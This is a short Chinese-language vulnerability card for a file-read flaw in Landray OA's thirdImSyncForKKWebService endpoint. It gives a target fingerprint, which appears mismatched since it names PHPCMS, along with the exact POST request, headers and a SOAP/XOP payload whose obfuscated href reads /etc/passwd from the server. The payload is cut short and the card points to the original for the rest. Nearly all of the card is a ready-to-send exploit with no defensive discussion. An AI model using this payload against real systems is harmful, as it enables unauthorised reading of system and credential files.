# 蓝凌OAthirdimsyncforkkwebservice存在任意文件读取漏洞

- **系统**：蓝凌　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="PC-PHPCMS"`
- **请求**：`POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1`
- **关键头**：`Content-Length: 633`　`Content-Type: multipart/related; boundary=aic4ddii0acc4ogaqgha`

**请求体 / payload**
```
--aic4ddii0acc4ogaqgha
Content-Disposition: form-data; name="message"
Content-Type: text/plain; charset=ISO-8859-1 Content-Transfer-Encoding: 8bit
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/%22 xmlns:web="http://webservice.kk.im.third.kmss.landray.com/%22> <soapenv:Header/> <soapenv:Body> <web:getTodo> <arg0> <otherCond>1</otherCond> <pageNo>1</pageNo> <rowSize>1</rowSize> <targets>1</targets> <type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include%22 href="file:///e%74c%2fpa%73%73wd"/></type> </arg0> </web:getTodo> </soapenv:Body> </soapenv:Envelope>…（脚本共 1396 字，完整版见原文）
```
- **预期**：200　|　—